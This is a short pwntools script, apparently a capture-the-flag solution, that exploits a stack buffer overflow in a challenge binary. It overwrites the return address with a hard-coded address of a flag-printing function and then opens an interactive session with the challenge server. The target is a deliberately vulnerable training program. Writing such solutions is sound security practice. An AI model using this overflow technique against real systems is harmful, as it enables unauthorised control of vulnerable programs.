# ret2win
from pwn import *

GIVE_FLAG_ADDR = 0x080485ab

conn = remote('chal.sigpwny.com', 1354)
# conn = process('./challenge-stack3')

exploit = b'A' * 0x14
exploit += p32(GIVE_FLAG_ADDR)

conn.sendline(exploit)

conn.interactive()